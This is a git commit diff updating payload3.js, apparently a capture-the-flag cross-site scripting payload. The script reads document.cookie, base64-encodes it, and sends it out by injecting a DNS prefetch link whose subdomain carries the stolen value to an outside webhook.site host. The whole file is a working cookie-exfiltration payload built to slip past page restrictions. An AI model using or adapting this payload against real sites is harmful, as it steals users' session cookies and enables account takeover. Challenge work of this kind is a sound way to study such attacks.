919ec1770af2e0f17c83a4db9f2ca00eb7d035b9
s25553258troy <s25553258troy@gmail.com>
2026-03-06 21:47:23 +0800

    Update payload3.js

--- payload3.js
+++ payload3.js
@@ -1,10 +1,11 @@
 let flag = document.cookie;
-// We encode the flag into a valid subdomain string (removing = and {})
+// Encode flag to Base64, remove padding, and make it lowercase to be a valid DNS subdomain
 let safeFlag = btoa(flag).replace(/=/g, '').toLowerCase();
 
-// Inject a DNS prefetch link into the head of the document
+// Inject a DNS prefetch link
 let link = document.createElement('link');
 link.rel = 'prefetch';
-// Point it to your webhook using DNS resolution
-link.href = 'http://' + safeFlag + '.webhook.site';
+
+// Construct the URL so it becomes: http://[FLAG_BASE64].c28bdc7e-0993-4d8f-9a72-728714667c7f.webhook.site
+link.href = 'http://' + safeFlag + '.c28bdc7e-0993-4d8f-9a72-728714667c7f.webhook.site/';
 document.head.appendChild(link);
